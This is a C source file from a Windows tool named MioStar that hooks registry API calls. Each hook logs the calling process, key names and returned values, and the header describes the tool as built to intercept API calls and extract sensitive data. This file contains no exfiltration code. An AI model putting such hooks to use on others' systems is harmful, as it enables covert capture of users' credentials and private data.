/*
 * Tool name   : MioStar
 * Description : Tool to intercept API calls and to extract sensitive data.
 * Version     : 0.2
 * Date        : 11.17.2010
 * Author      : Ruben Unteregger
 * Web page    : http://www.megapanzer.com
 * Todo        : 
 * Changes     : 11.17.2010 nss3.dll to intercept Firefox, Thunderbird + Seamonkey crypt/decrypt calls
 *
 *
 * License     :
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */




#include <windows.h>
#include <stdio.h>
#include "MioStar.h"
#include "RegistryReplacement.h"

extern char gProcName[MAX_BUF_SIZE + 1];
extern char *gProcShortPath;

extern byte* CG_RegOpenKeyExA;
extern byte* CG_RegOpenKeyExW;
extern byte* CG_RegOpenKeyA;
extern byte* CG_RegOpenKeyW;
extern byte* CG_RegQueryValueExA;
extern byte* CG_RegQueryValueExW;
extern byte* CG_RegQueryValueA;
extern byte* CG_RegQueryValueW;
extern byte* CG_RegGetValueA;
extern byte* CG_RegGetValueW;




/*
 *
 *
 */

LONG WINAPI MyRegGetValueA(HKEY hkey, LPCSTR lpSubKey, LPCSTR lpValue, DWORD dwFlags, LPDWORD pdwType, PVOID pvData, LPDWORD pcbData)
{
  LONG lRetVal = 0;
  char lTemp1[MAX_BUF_SIZE + 1];
  char lTemp2[MAX_BUF_SIZE + 1];
  MYREGGETVALUEA fRegQueryValueA = (MYREGGETVALUEA) CG_RegGetValueA;

  ZeroMemory(lTemp1, sizeof(lTemp1));
  ZeroMemory(lTemp2, sizeof(lTemp2));

  if(fRegQueryValueA)
    lRetVal = fRegQueryValueA(hkey, lpSubKey, lpValue, dwFlags, pdwType, pvData, pcbData);


  if (pvData != NULL && pcbData != NULL && *pcbData > 0)
    stringify((char *) pvData, *pcbData, lTemp2, sizeof(lTemp2)/2 - 1);

  snprintf(lTemp1, sizeof(lTemp1) - 1, "MyRegGetValueA():REG:%s:%s:%s:%s", gProcShortPath, lpSubKey, lpValue, lTemp2);
  printDebug(lTemp1, EVENT_REGISTRY);


  return(lRetVal);
}




/*
 *
 *
 */

LONG WINAPI MyRegGetValueW(HKEY hkey, LPCWSTR lpSubKey, LPCWSTR lpValue, DWORD dwFlags, LPDWORD pdwType, PVOID pvData, LPDWORD pcbData)
{
  LONG lRetVal = 0;
  char lTemp1[MAX_BUF_SIZE + 1];
  char lTemp2[MAX_BUF_SIZE + 1];
  MYREGGETVALUEW fRegQueryValueW = (MYREGGETVALUEW) CG_RegGetValueW;

  ZeroMemory(lTemp1, sizeof(lTemp1));
  ZeroMemory(lTemp2, sizeof(lTemp2));

  if(fRegQueryValueW)
    lRetVal = fRegQueryValueW(hkey, lpSubKey, lpValue, dwFlags, pdwType, pvData, pcbData);


  if (pvData != NULL && pcbData != NULL && *pcbData > 0)
    stringify((char *) pvData, *pcbData, lTemp2, sizeof(lTemp2)/2 - 1);

  snprintf(lTemp1, sizeof(lTemp1) - 1, "MyRegGetValueW():REG:%s:%S:%S:%s", gProcShortPath, lpSubKey, lpValue, lTemp2);
  printDebug(lTemp1, EVENT_REGISTRY);


  return(lRetVal);
}



/*
 *
 *
 */

LONG WINAPI MyRegQueryValueA(HKEY hKey, LPCSTR lpSubKey, LPTSTR lpValue, PLONG lpcbValue)
{
  LONG lRetVal = 0;
  char lTemp1[MAX_BUF_SIZE + 1];
  char lTemp2[MAX_BUF_SIZE + 1];
  MYREGQUERYVALUEA fRegQueryValueA = (MYREGQUERYVALUEA) CG_RegQueryValueA;

  ZeroMemory(lTemp1, sizeof(lTemp1));
  ZeroMemory(lTemp2, sizeof(lTemp2));

  if(fRegQueryValueA)
    lRetVal = fRegQueryValueA(hKey, lpSubKey, lpValue, lpcbValue);



  if (lpcbValue != NULL && lpValue != NULL && *lpcbValue > 0)
    stringify((char *) lpValue, *lpcbValue, lTemp2, sizeof(lTemp2)/2 - 1);

  snprintf(lTemp1, sizeof(lTemp1) - 1, "MyRegQueryValueA():REG:%s:%s:%d:%s", gProcShortPath, lpSubKey, *lpcbValue, lTemp2);
  printDebug(lTemp1, EVENT_REGISTRY);

  return(lRetVal);
}


/*
 *
 *
 */

LONG WINAPI MyRegQueryValueW(HKEY hKey, LPCWSTR lpSubKey, LPTSTR lpValue, PLONG lpcbValue)
{
  LONG lRetVal = 0;
  char lTemp1[MAX_BUF_SIZE + 1];
  char lTemp2[MAX_BUF_SIZE + 1];
  MYREGQUERYVALUEW fRegQueryValueW = (MYREGQUERYVALUEW) CG_RegQueryValueW;

  ZeroMemory(lTemp1, sizeof(lTemp1));
  ZeroMemory(lTemp2, sizeof(lTemp2));

  if(fRegQueryValueW)
    lRetVal = fRegQueryValueW(hKey, lpSubKey, lpValue, lpcbValue);

  if (lpcbValue != NULL && lpValue != NULL && *lpcbValue > 0)
    stringify((char *) lpValue, *lpcbValue, lTemp2, sizeof(lTemp2)/2 - 1);


  snprintf(lTemp1, sizeof(lTemp1) - 1, "MyRegQueryValueW():REG:%s:%s:%d:%s", gProcShortPath, lpSubKey, *lpcbValue, lTemp2);
  printDebug(lTemp1, EVENT_REGISTRY);


  return(lRetVal);
}



/*
 *
 *
 */

LONG WINAPI MyRegQueryValueExA(HKEY hKey, LPCSTR lpValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData)
{
  LONG lRetVal = 0;
  char lTemp1[MAX_BUF_SIZE + 1];
  char lTemp2[MAX_BUF_SIZE + 1];
  char lTemp3[MAX_BUF_SIZE + 1];
  MYREGQUERYVALUEEXA fRegQueryValueExA = (MYREGQUERYVALUEEXA) CG_RegQueryValueExA;

  ZeroMemory(lTemp1, sizeof(lTemp1));
  ZeroMemory(lTemp2, sizeof(lTemp2));
  ZeroMemory(lTemp3, sizeof(lTemp3));

  if(fRegQueryValueExA)
    lRetVal = fRegQueryValueExA(hKey, lpValueName, lpReserved, lpType, lpData, lpcbData);

  getDataType(lpType, lTemp3);

  if (lpcbData != NULL && lpData != NULL && *lpcbData > 0)
    stringify((char *) lpData, *lpcbData, lTemp2, sizeof(lTemp2)/2 - 1);

  snprintf(lTemp1, sizeof(lTemp1) - 1, "MyRegQueryValueExA():REG:%s:%s:%s:%d:%s", gProcShortPath, lTemp3, lpValueName, *lpcbData, lTemp2);
  printDebug(lTemp1, EVENT_REGISTRY);


  return(lRetVal);
}





/*
 *
 *
 */

LONG WINAPI MyRegQueryValueExW(HKEY hKey, LPCWSTR lpValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData)
{
  LONG lRetVal = 0;
  char lTemp1[MAX_BUF_SIZE + 1];
  char lTemp2[MAX_BUF_SIZE + 1];
  char lTemp3[MAX_BUF_SIZE + 1];
  MYREGQUERYVALUEEXW fRegQueryValueExW = (MYREGQUERYVALUEEXW) CG_RegQueryValueExW;

  ZeroMemory(lTemp1, sizeof(lTemp1));
  ZeroMemory(lTemp2, sizeof(lTemp2));
  ZeroMemory(lTemp3, sizeof(lTemp3));

  if(fRegQueryValueExW)
    lRetVal = fRegQueryValueExW(hKey, lpValueName, lpReserved, lpType, lpData, lpcbData);


  if (lpcbData != NULL && lpData != NULL && *lpcbData > 0)
    stringify((void *) lpData, *lpcbData, lTemp2, sizeof(lTemp2)/2 - 1);

  getDataType(lpType, lTemp3);

  snprintf(lTemp1, sizeof(lTemp1) - 1, "MyRegQueryValueExW():REG:%s:%s:%S:%s", gProcShortPath, lTemp3, lpValueName, lTemp2);
  printDebug(lTemp1, EVENT_REGISTRY);




  return(lRetVal);
}




/*
 *
 *
 */

LONG WINAPI MyRegOpenKeyA(HKEY hKey, LPCSTR lpSubKey, PHKEY phkResult)
{
  LONG lRetVal = 0;
  char lTemp1[MAX_BUF_SIZE + 1];
  char lTemp2[MAX_BUF_SIZE + 1];
  MYREGOPENKEYA fRegOpenKeyA = (MYREGOPENKEYA) CG_RegOpenKeyA;

  ZeroMemory(lTemp1, sizeof(lTemp1));
  ZeroMemory(lTemp2, sizeof(lTemp2));

  getKeyRootName(hKey, lTemp2);

  snprintf(lTemp1, sizeof(lTemp1) - 1, "MyRegOpenKeyA():REG:%s:%s:%s", gProcShortPath, lTemp2, lpSubKey);
  printDebug(lTemp1, EVENT_REGISTRY);


  if(fRegOpenKeyA)
    lRetVal = fRegOpenKeyA(hKey, lpSubKey, phkResult);

  return(lRetVal);
}


	

/*
 *
 *
 */

LONG WINAPI MyRegOpenKeyW(HKEY hKey, LPCWSTR lpSubKey, PHKEY phkResult)
{
  LONG lRetVal = 0;
  char lTemp1[MAX_BUF_SIZE + 1];
  char lTemp2[MAX_BUF_SIZE + 1];
  MYREGOPENKEYW fRegOpenKeyW = (MYREGOPENKEYW) CG_RegOpenKeyW;
  
  ZeroMemory(lTemp1, sizeof(lTemp1));
  ZeroMemory(lTemp2, sizeof(lTemp2));


  getKeyRootName(hKey, lTemp2);

  snprintf(lTemp1, sizeof(lTemp1) - 1, "MyRegOpenKeyW():REG:%s:%s:%S", gProcShortPath, lTemp2, lpSubKey);
  printDebug(lTemp1, EVENT_REGISTRY);

  if(fRegOpenKeyW)
    lRetVal = fRegOpenKeyW(hKey, lpSubKey, phkResult);

  return(lRetVal);
}



/*
 *
 *
 */

LONG WINAPI MyRegOpenKeyExA(HKEY hKey, LPCSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult)
{
  LONG lRetVal = 0;
  char lTemp1[MAX_BUF_SIZE + 1];
  char lTemp2[MAX_BUF_SIZE + 1];
  MYREGOPENKEYEXA fRegOpenKeyExA = (MYREGOPENKEYEXA) CG_RegOpenKeyExA;

  ZeroMemory(lTemp1, sizeof(lTemp1));
  ZeroMemory(lTemp2, sizeof(lTemp2));


  if (hKey == HKEY_CLASSES_ROOT)
    strcpy(lTemp2, "CLASSES_ROOT");
  else if (hKey == HKEY_CURRENT_CONFIG)
    strcpy(lTemp2, "CURRENT_CONFIG");
  else if (hKey == HKEY_CURRENT_USER )
    strcpy(lTemp2, "CURRENT_USER");
  else if (hKey == HKEY_LOCAL_MACHINE)
    strcpy(lTemp2, "LOCAL_MACHINE");
  else if (hKey == HKEY_USERS)
    strcpy(lTemp2, "USERS");
  else
    snprintf(lTemp2, sizeof(lTemp2) - 1, "UNKNOWN (%d)", hKey);


  snprintf(lTemp1, sizeof(lTemp1) - 1, "MyRegOpenKeyExA():REG:%s:%s:%s", gProcShortPath, lTemp2, lpSubKey);
  printDebug(lTemp1, EVENT_REGISTRY);


  if(fRegOpenKeyExA)
    lRetVal = fRegOpenKeyExA(hKey, lpSubKey, ulOptions, samDesired, phkResult);

  return(lRetVal);
}





/*
 *
 *
 */

LONG WINAPI MyRegOpenKeyExW(HKEY hKey, LPCWSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult)
{
  LONG lRetVal = 0;
  char lTemp1[MAX_BUF_SIZE + 1];
  char lTemp2[MAX_BUF_SIZE + 1];
  MYREGOPENKEYEXW fRegOpenKeyExW = (MYREGOPENKEYEXW) CG_RegOpenKeyExW;
  
  ZeroMemory(lTemp1, sizeof(lTemp1));
  ZeroMemory(lTemp2, sizeof(lTemp2));


  if (hKey == HKEY_CLASSES_ROOT)
    strcpy(lTemp2, "CLASSES_ROOT");
  else if (hKey == HKEY_CURRENT_CONFIG)
    strcpy(lTemp2, "CURRENT_CONFIG");
  else if (hKey == HKEY_CURRENT_USER )
    strcpy(lTemp2, "CURRENT_USER");
  else if (hKey == HKEY_LOCAL_MACHINE)
    strcpy(lTemp2, "LOCAL_MACHINE");
  else if (hKey == HKEY_USERS)
    strcpy(lTemp2, "USERS");
  else
    snprintf(lTemp2, sizeof(lTemp2) - 1, "UNKNOWN (%d)", hKey);



  snprintf(lTemp1, sizeof(lTemp1) - 1, "MyRegOpenKeyExW():REG:%s:%s:%S", gProcShortPath, lTemp2, lpSubKey);
  printDebug(lTemp1, EVENT_REGISTRY);


  if(fRegOpenKeyExW)
    lRetVal = fRegOpenKeyExW(hKey, lpSubKey, ulOptions, samDesired, phkResult);

  return(lRetVal);
}



/*
 *
 *
 */

void getDataType(DWORD *pType, char *pOutBuffer)
{

  if (pType == NULL)
    strcpy(pOutBuffer, "UNDEFINED");
  else if (*pType == REG_BINARY)
    strcpy(pOutBuffer, "REG_BINARY");
  else if (*pType == REG_DWORD)
    strcpy(pOutBuffer, "REG_DWORD");
  else if (*pType == REG_DWORD_LITTLE_ENDIAN)
    strcpy(pOutBuffer, "REG_DWORD_LITTLE_ENDIAN");
  else if (*pType == REG_DWORD_BIG_ENDIAN)
    strcpy(pOutBuffer, "REG_DWORD_BIG_ENDIAN");
  else if (*pType == REG_EXPAND_SZ)
    strcpy(pOutBuffer, "REG_EXPAND_SZ");
  else if (*pType == REG_LINK)
    strcpy(pOutBuffer, "REG_LINK");
  else if (*pType == REG_MULTI_SZ)
    strcpy(pOutBuffer, "REG_MULTI_SZ");
  else if (*pType == REG_NONE)
    strcpy(pOutBuffer, "REG_NONE");
  else if (*pType == REG_QWORD)
    strcpy(pOutBuffer, "REG_QWORD");
  else if (*pType == REG_QWORD_LITTLE_ENDIAN)
    strcpy(pOutBuffer, "REG_QWORD_LITTLE_ENDIAN");
  else if (*pType == REG_SZ)
    strcpy(pOutBuffer, "REG_SZ");
  else
    strcpy(pOutBuffer, "UNKNOWN");
}





/*
 *
 *
 */

void getKeyRootName(HKEY pKeyHandle, char *pOutBuffer)
{
  if (pKeyHandle == HKEY_CLASSES_ROOT)
    strcpy(pOutBuffer, "CLASSES_ROOT");
  else if (pKeyHandle == HKEY_CURRENT_CONFIG)
    strcpy(pOutBuffer, "CURRENT_CONFIG");
  else if (pKeyHandle == HKEY_CURRENT_USER )
    strcpy(pOutBuffer, "CURRENT_USER");
  else if (pKeyHandle == HKEY_LOCAL_MACHINE)
    strcpy(pOutBuffer, "LOCAL_MACHINE");
  else if (pKeyHandle == HKEY_USERS)
    strcpy(pOutBuffer, "USERS");
  else
    strcpy(pOutBuffer, "UNKNOWN");
}


